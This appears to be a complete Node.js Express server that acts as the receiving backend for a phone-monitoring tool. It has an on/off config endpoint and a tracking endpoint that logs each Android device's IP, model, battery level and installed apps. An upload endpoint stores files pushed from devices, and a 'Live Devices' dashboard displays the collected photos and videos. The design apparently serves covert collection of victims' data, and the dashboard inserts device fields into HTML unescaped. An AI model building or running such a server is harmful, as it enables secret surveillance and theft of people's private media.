const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();

/* ================= CONFIG ================= */

const LOG_FILE = "logs.json";

const UPLOAD_DIR = path.join(__dirname, "uploads");
const THUMB_DIR = path.join(__dirname, "thumbs");

if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR);
if (!fs.existsSync(THUMB_DIR)) fs.mkdirSync(THUMB_DIR);

/* ================= HELPERS ================= */

function getIP(req) {
  return (req.headers['x-forwarded-for'] || '').split(',')[0]
    || req.socket.remoteAddress
    || "unknown";
}

function loadLogs() {
  try {
    return fs.readFileSync(LOG_FILE, "utf-8")
      .split("\n")
      .filter(Boolean)
      .map(x => JSON.parse(x));
  } catch {
    return [];
  }
}

function saveLog(data) {
  fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
}

function isDuplicate(fileName) {
  const logs = loadLogs();
  return logs.some(l => l.original === fileName);
}

/* ================= CONFIG ================= */








/* ================= CONFIG ================= */
app.get('/config', (req, res) => {
  res.send("1"); // enable
});

/* ================= TRACK ================= */

app.get('/track', (req, res) => {

  const apps = req.query.apps
    ? req.query.apps.split(",").map(x => x.trim()).filter(Boolean)
    : [];

  const systemApps = apps.filter(a =>
    a.startsWith("android") ||
    a.startsWith("com.android") ||
    a.startsWith("com.google")
  );

  const userApps = apps.filter(a => !systemApps.includes(a));

  const deviceId = getIP(req) + "_" + (req.query.model || "unknown");

  const data = {
    type: "device",
    device_id: deviceId,
    ip: getIP(req),
    battery: req.query.battery,
    model: req.query.model,
    brand: req.query.brand,
    android: req.query.android,
    app_count: apps.length,
    system_apps: systemApps,
    user_apps: userApps,
    time: new Date().toISOString()
  };

  console.log("📱 DEVICE:", data.model);

  saveLog(data);

  res.json({ status: "ok" });
});

/* ================= UPLOAD ================= */

app.post('/upload', (req, res) => {

  let fileName = "file.bin";

  if (req.query.name) {
    try {
      fileName = path.basename(decodeURIComponent(req.query.name));
    } catch {}
  }

  if (isDuplicate(fileName)) {
    return res.json({ status: "duplicate_skipped" });
  }

  const safeName = Date.now() + "_" + fileName;
  const filePath = path.join(UPLOAD_DIR, safeName);
  const thumbPath = path.join(THUMB_DIR, "thumb_" + safeName);

  const deviceId = getIP(req);

  const stream = fs.createWriteStream(filePath);
  req.pipe(stream);

  req.on('end', () => {

    fs.copyFile(filePath, thumbPath, () => {});

    saveLog({
      type: "file",
      device_id: deviceId,
      file: safeName,
      original: fileName,
      time: new Date().toISOString()
    });

    res.json({ status: "uploaded", file: safeName });
  });

  req.on('error', () => {
    res.status(500).send("error");
  });
});

/* ================= USERS ================= */

app.get('/users', (req, res) => {

  const logs = loadLogs();

  const devices = logs.filter(x => x.type === "device");
  const files = logs.filter(x => x.type === "file");

  const grouped = {};

  devices.forEach(d => {
    const id = d.device_id;
    if (!grouped[id]) grouped[id] = { info: d, files: [] };
  });

  files.forEach(f => {
    const id = f.device_id;
    if (grouped[id]) {
      grouped[id].files.push(f);
    }
  });

  let html = `
  <html>
  <head>
    <meta http-equiv="refresh" content="5">
    <style>
      body { background:#111;color:#fff;font-family:sans-serif }
      .box { border:2px solid #444;margin:15px;padding:15px }
      img, video { width:150px;margin:5px;border-radius:10px }
    </style>
  </head>
  <body>
  <h1>🔥 Live Devices</h1>
  `;

  Object.values(grouped).reverse().forEach(g => {

    const u = g.info;

    html += `
    <div class="box">
      <h2>📱 ${u.brand || ""} ${u.model || ""}</h2>
      IP: ${u.ip}<br>
      Battery: ${u.battery}%<br>
      Apps: ${u.app_count}<br>

      <h3>📂 Files (${g.files.length})</h3>
    `;

    g.files.slice(-10).reverse().forEach(f => {

      const url = "/uploads/" + f.file;

      if (f.file.endsWith(".jpg") || f.file.endsWith(".png")) {
        html += `<img src="${url}">`;
      } else if (f.file.endsWith(".mp4")) {
        html += `<video controls src="${url}"></video>`;
      } else {
        html += `<div>📄 ${f.original}</div>`;
      }

    });

    html += `</div>`;
  });

  html += "</body></html>";

  res.send(html);
});

/* ================= STATIC ================= */

app.use('/uploads', express.static(UPLOAD_DIR));
app.use('/thumbs', express.static(THUMB_DIR));

/* ================= START ================= */

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("🚀 Server running on port", PORT);
});
